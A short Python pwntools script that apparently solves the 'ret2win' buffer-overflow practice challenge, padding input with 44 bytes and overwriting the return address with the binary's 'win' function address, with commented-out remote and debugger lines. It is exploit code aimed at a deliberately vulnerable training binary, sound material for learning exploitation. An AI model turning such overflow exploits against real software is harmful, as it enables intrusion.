#!/usr/bin/env python3
from pwn import *
elf = ELF('ret2win')
p = elf.process()
print(elf.symbols['win'])
winfunc = p32(elf.symbols['win'])
print(winfunc)
# conn = remote(host, port)
payload = b'a'*44+winfunc
print(payload)
p.sendline(payload)
# gdb.attach(p
#            ,gdbscript=f"""
#             break *vuln+106
#             r <<< {payload}
#             """)
print(p.recvline().decode().strip())

p.interactive()